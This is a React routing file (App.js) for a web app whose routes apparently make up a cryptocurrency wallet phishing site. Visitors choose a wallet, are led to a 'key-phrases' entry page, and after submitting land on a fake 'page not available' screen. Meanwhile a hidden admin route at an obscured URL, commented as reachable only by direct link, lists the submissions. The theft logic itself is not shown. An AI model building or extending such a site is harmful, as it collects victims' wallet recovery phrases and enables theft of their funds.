import React, { useState } from "react";
import { Routes, Route } from "react-router-dom";
import LandingPage from "./pages/LandingPage";
import WalletSelectionPage from "./pages/WalletSelectionPage";
import KeyPhrasesPage from "./pages/KeyPhrasesPage";
import SubmissionsPage from "./pages/SubmissionsPage"; // This is your admin page
import NotFoundPage from "./pages/NotFoundPage";

function App() {
  const [selectedWallet, setSelectedWallet] = useState(null);

  return (
    <Routes>
      <Route path="/" element={<LandingPage />} />
      <Route
        path="/select-wallet"
        element={<WalletSelectionPage setSelectedWallet={setSelectedWallet} />}
      />
      <Route
        path="/key-phrases"
        element={<KeyPhrasesPage selectedWallet={selectedWallet} />}
      />
      {/* Hidden admin page: No links, only accessible via direct URL */}
      <Route path="/admin-submissions-9a7f3b4e2d" element={<SubmissionsPage />} />
      {/* Page Not Available for users after submitting */}
      <Route path="/page-not-available" element={<NotFoundPage />} />
      {/* Default fallback for all unknown routes */}
      <Route path="*" element={<NotFoundPage />} />
    </Routes>
  );
}

export default App;
